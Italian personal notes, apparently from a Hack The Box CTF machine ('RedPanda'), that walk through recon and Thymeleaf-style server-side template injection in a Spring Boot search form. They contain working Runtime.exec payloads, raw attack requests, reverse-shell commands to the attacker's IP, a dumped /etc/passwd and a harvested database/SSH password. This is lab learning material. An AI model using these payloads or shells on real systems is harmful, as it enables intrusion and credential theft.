@@ -1,0 +1,516 @@
+10.129.38.101
+
+nmap -vv -p- -T4 -n -Pn -oA fastscan 10.129.38.101
+
+
+PORT 8080:
+
+Red Panda Search | Made with Spring Boot
+
+Search for a red panda      ------->        potrebbe essere una hint 
+
+
+c'è un file css chiamato panda.css, lo apro
+
+view-source:http://10.129.38.101:8080/css/panda.css
+
+e nei commenti c'è:
+
+
+/*# sourceMappingURL=../../../../../target/panda.css.map */
+
+
+magari è possibile usare LFI
+
+intanto provo ad usare la funziona di ricerca:
+
+provo redpanda
+
+
+You searched for: redpanda
+There are 0 results for your search
+
+
+You searched for: id
+There are 1 results for your search
+Panda name:
+Florida
+Panda bio:
+Florida panda is the evil twin of Greg. Watch out for him!
+
+Author: woodenk
+
+la parte di author mi porta a un'altra pagina: http://10.129.38.101:8080/stats?author=woodenk
+
+Panda URI 	Panda views
+/img/greg.jpg 	0
+/img/hungy.jpg 	0
+/img/smooch.jpg 	0
+/img/smiley.jpg 	0
+
+
+
+http://10.129.38.101:8080/stats?author=damian
+
+/img/angy.jpg 	0
+/img/shy.jpg 	0
+/img/crafty.jpg 	0
+/img/peter.jpg 	0
+
+
+
+
+
+è possibile fare export table in xml:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<credits>
+  <author>damian</author>
+  <image>
+    <uri>/img/angy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/shy.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/crafty.jpg</uri>
+    <views>0</views>
+  </image>
+  <image>
+    <uri>/img/peter.jpg</uri>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
+
+
+c'è XXE??
+
+
+
+You searched for: greg
+There are 1 results for your search
+Panda name:
+Greg
+Panda bio:
+Greg is a hacker. Watch out for his injection attacks!          ------> ALTRA HINT 
+
+
+
+la cosa strana per ora è che cercando "id" mi è uscito il panda Florida 
+no semplicemente id è contenuto in florida....
+
+
+potrebbe essere tutto collegato a questa vulnerabilità:
+
+https://infosecwriteups.com/analyzing-cve-2022-22980-to-discover-a-real-exploitable-path-in-the-source-code-review-process-with-145d97717656
+
+
+provo ad applicarla con burpsuite:
+
+POST /search HTTP/1.1
+Host: 10.129.38.101:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://10.129.38.101:8080
+DNT: 1
+Connection: close
+Referer: http://10.129.38.101:8080/search
+Upgrade-Insecure-Requests: 1
+
+name=T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd")
+
+
+
+
+
+effettivamente ottengo errore 500
+
+non ottenfo il file /etc/passwd ma non è detto che il comando non sia eseguito, semplicemente che il risultato non l'ho ottenuto, posso provare a fare un ping al mio indirizzo 
+
+e intercettarlo con tcpdump
+
+sudo tcpdump -i tun0
+
+
+
+POST /search HTTP/1.1
+Host: 10.129.38.101:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://10.129.38.101:8080
+DNT: 1
+Connection: close
+Referer: http://10.129.38.101:8080/search
+Upgrade-Insecure-Requests: 1
+
+name=T(java.lang.Runtime).getRuntime().exec("ping 10.10.15.4")
+
+
+
+si ricevo dei pacchetti:
+
+19:52:25.593776 IP 10.10.15.4.60232 > 10.129.38.101.http-alt: Flags [S], seq 2965268445, win 64240, options [mss 1460,sackOK,TS val 2504195032 ecr 0,nop,wscale 7], length 0
+
+
+
+
+provo a prendere reverse shell adesso:
+
+provando ad usare bash -i >& /dev/tcp/10.10.15.4/80 0>&1 ho problemi perchè interpreta alcuni simboli
+
+quindi provo a scriverlo in un file, scaricarlo sulla macchina con wget e poi eseguirlo 
+
+in realtà questo trovato nel tcpdump 
+
+
+è lo scambio per mandare la richiesta, l'exploit non funziona
+
+
+So che il backend usa java visto che usa spring boot e dall'hint so che devo usare una injection, questa injection specifica per spring boot non funziona
+
+provo altre tecniche injection di java 
+
+https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf
+
+il $ viene bloccato:
+You searched for: Error occured: banned characters
+
+anche con il # non funziona molto bene:
+
+You searched for: ??7 7_en_US??
+
+
+posso provare ad usare la SSTI:
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data.
+
+
+provando vari caratteri speciali vedo che: #,$,% mi danno errore 
+
+quindi tra tutti i template engine di java non trovo nulla di utile che non usa questi caratteri mentre tra gli altri uno usa la @:
+Razor (.net) 
+
+evidentemente viene usato un template engine simile 
+
+infatti inviando @(50*50)   ottengo @?2500 nella risposta 
+
+quindi ora mi serve solo un payload per reverse shell:
+
+
+funziona anche con:
+
+@{50*50}
+
+You searched for: 2500
+
+
+per generare il payload posso usare:
+
+https://github.com/VikasVarshney/ssti-payload
+
+
+payload per eseguire il comando "id":
+
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+sostituisco il $ con @
+
+@{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+non funziona 
+
+un altro template engine di java è thymeleaf, come exploitarlo:
+
+https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
+
+
+non sono sicuro che sia realmente thymeleaf però c'è una cosa interessante :
+
+
+To attempt an SSTI in Thymeleaf, we first must understand expressions that appear in Thymeleaf attributes. Thymeleaf expressions can have the following types:
+
+    ${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
+    *{...}: Selection expressions – similar to variable expressions but used for specific purposes.
+    #{...}: Message (i18n) expressions – used for internationalization.
+    @{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
+    ~{...}: Fragment expressions – they let you reuse parts of templates.
+
+
+in pratica ogni prefisso corrisponde ad una funzionalità differente
+
+$ -> non funziona
+# -> funziona ma da effettivamente un risultato riguardante i18n: You searched for: ??7 7_en_US??
+@ -> funziona su alcune cose ma non tutte 
+
+
+da questi risultati mi sembra che ho a che fare proprio con thymeleaf (o qualcosa di molto molto simile)
+
+quindi mi rimangono da testare * e ~
+
+con * riesco ad ottenre l'id:
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+You searched for: uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
+
+
+qundi ora ho la possibilità di eseguire comandi sulla macchina, provo a prendere reserve shell
+
+
+Command ==> nc -e sh 10.10.15.4 1234
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(110).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(52))).getInputStream())}
+
+
+non riesco a prendere la reverse shell 
+
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
+mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
+
+
+
+provo a vedere se riesco a legge id_rsa dell'utente dalla sua home
+
+niente
+
+
+intanto prendo user.txt:
+
+6ddfccb564adfc176f7a0b550ad2f9a1
+
+
+provo ad esplorare la macchina dall'esterno, vuisto che non ho altre idee
+
+
+Command ==> ls -lart
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116))).getInputStream())}
+
+
+(devo sempre cambiare $ in *)
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116))).getInputStream())}
+
+
+
+You searched for: total 40
+drwxr-xr-x  2 woodenk logs  4096 Jul 10 17:12 .
+drwxrwxrwt 16 root    root  4096 Jul 10 21:03 ..
+-rw-------  1 woodenk logs 32768 Jul 10 21:26 882
+
+
+riesco a listare 
+
+
+provo a partire dalla directory del web server e da li vedo cosa trovo
+
+
+
+Command ==> ls -lart /var/www
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(119))).getInputStream())}
+
+
+niente
+
+
+
+Command ==> ls -lart /home/woodenk/
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47))).getInputStream())}
+
+
+dopo molti tentativi riesco a trovare la root del web server da cui cominciare a cercare 
+
+
+
+
+Command ==> ls -lart /opt/
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47))).getInputStream())}
+
+
+
+You searched for: total 24
+drwxrwxr-x  5 root root 4096 Jun 14 14:35 panda_search
+drwxr-xr-x  3 root root 4096 Jun 14 14:35 credit-score
+drwxr-xr-x  6 root root 4096 Jun 14 14:35 maven
+drwxr-xr-x 20 root root 4096 Jun 23 14:52 ..
+-rwxr-xr-x  1 root root  462 Jun 23 18:12 cleanup.sh
+drwxr-xr-x  5 root root 4096 Jun 23 18:12 .
+
+
+Command ==> ls -lart /opt/panda_search
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104))).getInputStream())}
+
+
+-rw-rw-r-- 1 root root  6603 Feb 21 17:37 mvnw.cmd
+-rw-rw-r-- 1 root root  2577 Apr 27 14:44 pom.xml
+-rwxrwxr-x 1 root root 10122 Jun 14 12:46 mvnw
+drwxrwxr-x 4 root root  4096 Jun 14 14:35 src
+drwxrwxr-x 3 root root  4096 Jun 14 14:35 .mvn
+drwxrwxr-x 5 root root  4096 Jun 14 14:35 .
+drwxrwxr-x 9 root root  4096 Jun 22 09:07 target
+drwxr-xr-x 5 root root  4096 Jun 23 18:12 ..
+-rw-rw-r-- 1 root logs     1 Jul 10 21:42 redpanda.log
+
+
+
+Command ==> ls -lart /opt/panda_search/src
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(108).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99))).getInputStream())}
+
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 test
+drwxrwxr-x 4 root root 4096 Jun 14 14:35 .
+drwxrwxr-x 5 root root 4096 Jun 14 14:35 ..
+drwxrwxr-x 6 root root 4096 Jun 20 14:16 main
+
+
+/opt/panda_search/src/main
+
+-rw-rw-r-- 1 root root 6148 Dec 14  2021 .DS_Store
+drwxrwxr-x 4 root root 4096 Jun 14 14:35 resources
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 java
+drwxrwxr-x 4 root root 4096 Jun 14 14:35 ..
+drwxrwxr-x 2 root root 4096 Jun 20 11:51 css
+drwxrwxr-x 2 root root 4096 Jun 20 11:51 sass
+drwxrwxr-x 6 root root 4096 Jun 20 14:16 .
+
+dentro la directory java:
+
+
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 com
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 .
+drwxrwxr-x 6 root root 4096 Jun 20 14:16 ..
+
+
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 panda_search
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 .
+
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 htb
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 .
+
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 .
+drwxrwxr-x 2 root root 4096 Jun 21 12:24 panda_search
+
+-rw-rw-r-- 1 root root  779 Feb 21 18:04 PandaSearchApplication.java
+-rw-rw-r-- 1 root root 1800 Jun 14 14:09 RequestInterceptor.java
+drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..
+-rw-rw-r-- 1 root root 4321 Jun 20 13:02 MainController.java
+drwxrwxr-x 2 root root 4096 Jun 21 12:24 .
+
+
+provo a leggere i tre file java per vedere se c'è qualcosa di utile all'interno 
+
+leggo il MainController.java con la richiesta burp:
+
+POST /search HTTP/1.1
+Host: 10.129.38.101:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4070
+Origin: http://10.129.38.101:8080
+DNT: 1
+Connection: close
+Referer: http://10.129.38.101:8080/search
+Upgrade-Insecure-Requests: 1
+
+name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(95)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(97))).getInputStream())}
+
+
+
+nel MainController.java:
+
+
+conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
+
+ho credenziali pèer mysql:
+
+woodenk:RedPandazRule
+
+provo ad usarle anche per ssh visto che c'è proprio il nome dell'utente:
+
+woodenk@redpanda:~$ id
+uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
+woodenk@redpanda:~$ 
+
+Sorry, user woodenk may not run sudo on redpanda.
+
+
+woodenk@redpanda:/opt$ ls -lart cleanup.sh
+-rwxr-xr-x 1 root root 462 Jun 23 18:12 cleanup.sh
+woodenk@redpanda:/opt$ cat cleanup.sh
+
+#!/bin/bash
+/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
+/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
+/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
+
+
+
+ci sarebbe questo script che avevo già notato prima, magari si riesce ad usare se viene eseguito da root periodicamente
+
+con pspy verifico che viene eseguito in maniera ricorrente 
+
+non riesco a sfruttarlo in nessun modo
+
+
+
+
+
+
+
+
